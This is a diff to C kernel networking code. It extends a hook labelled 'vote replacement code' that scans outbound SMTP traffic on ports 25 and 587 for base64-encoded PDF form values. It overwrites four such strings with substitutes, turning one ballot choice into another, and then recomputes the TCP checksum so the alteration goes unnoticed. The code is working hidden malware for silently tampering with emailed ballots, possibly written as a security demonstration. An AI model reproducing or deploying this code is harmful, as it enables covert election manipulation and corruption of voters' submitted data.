@@ -16,17 +16,22 @@
  
 // begin vote replacement code
 if (skb && skb->protocol == htons(ETH_P_IP)) {
-  struct iphdr *iph = ip_hdr(skb);
+﻿ struct iphdr *iph = ip_hdr(skb);
   struct tcphdr *tcph;
   unsigned char *tcpbuf;
-  // find is base64-encoded "Aardvark" vote we want to replace
-  const unsigned char *find    = "PDwgL1YgL0FhcmR2YXJr";
-  // replace is base64-encoded "Zebra" vote we want to replace it with
-  const unsigned char *replace = "PDwgL1YgL1plYnJhICAg";
-  const int target_len = strlen(find);
-  unsigned char *match = NULL;
-  int offset = 0;
-  int tcplen;
+  // find is strings we want to find
+  const int num_targets = 4;
+  const unsigned char *find[] = 
+    { "PCAvViAvTkZM", "UyAvTkZM", 
+      "UCA4OCAwIFIgL0ggL1AgL1BhcmVudCAyNCAwIFIKL0FTIC9PZmYg",
+      "IC9PZmYgL1R5cGUgL0Fubm90IC9GZiA0OTE1MiA+PgplbmRvYmoKODgg" };
+  // replace is strings we want to replace them with
+  const unsigned char *replace[] = 
+    { "PCAvViAvTUxT", "UyAvT2Zm", 
+      "UCA4OCAwIFIgL0ggL1AgL1BhcmVudCAyNCAwIFIKL0FTIC9NTFMg",
+      "IC9NTFMgL1R5cGUgL0Fubm90IC9GZiA0OTE1MiA+PgplbmRvYmoKODgg" };
+  int matched = 0;
+  int tcplen = 0;
   
   if (iph && iph->protocol && iph->protocol == IPPROTO_TCP) {
     // figure out where this tcp packet is going, using tcplen
@@ -35,6 +40,8 @@ if (skb && skb->protocol == htons(ETH_P_IP)) {
     tcplen = ntohs(tcph->dest);
 
     if (((tcplen == 25) || (tcplen == 587)) && !skb_linearize(skb)) {
+      int t = 0;
+      
       // at this point the SKB is linearized, so all data is in the 
       // data segment; since we may have changed some of its internal 
       // structure in linearization, we do some recalculations
@@ -43,28 +50,39 @@ if (skb && skb->protocol == htons(ETH_P_IP)) {
       tcpbuf = (unsigned char *)tcph;
       tcplen = ntohs(iph->tot_len) - sizeof(struct iphdr);
 
-      // search for the string to replace; this is a naive search
+      // search for the strings to replace; this is a naive search
       // algorithm and could be made more efficient in many ways
-      while (!match && offset < tcplen) {
-        int cnt = 0;
-        while (cnt < target_len && (offset + cnt < tcplen)) {
-          if (tcpbuf[offset + cnt] == find[cnt]) {
-            cnt++;
-          } else {
-            break;
+      for (t = 0; t < num_targets; t++) {
+        char *location = NULL;
+        const unsigned char *target = find[t];
+        const int target_len = strlen(target);
+        int offset = 0;
+        
+        while (!location && offset < tcplen) {
+          int cnt = 0;
+          while (cnt < target_len && (offset + cnt < tcplen)) {
+            if (tcpbuf[offset + cnt] == target[cnt]) {
+              cnt++;
+            } else {
+              break;
+            }
           }
+          if (cnt == target_len) {
+            location = tcpbuf + offset;
+          } 
+          offset++;
         }
-        if (cnt == target_len) {
-          match = tcpbuf + offset;
+
+        if (location != NULL) {
+          matched++;
+          memcpy(location, replace[t], target_len);
         }
-        offset++;
       }
       
-      // replace the string and recalculate TCP checksum if we found 
-      // a match; IP checksum stays the same because we don't change
-      // packet size, source, or destination
-      if (match != NULL) {
-        memcpy(match, replace, target_len);
+      // recalculate TCP checksum if we found a match; IP checksum 
+      // stays the same because we don't change packet size, source, 
+      // or destination
+      if (matched > 0) {
         tcph->check = 0;
         tcph->check = csum_tcpudp_magic(iph->saddr, iph->daddr, 
                                         tcplen, IPPROTO_TCP, 
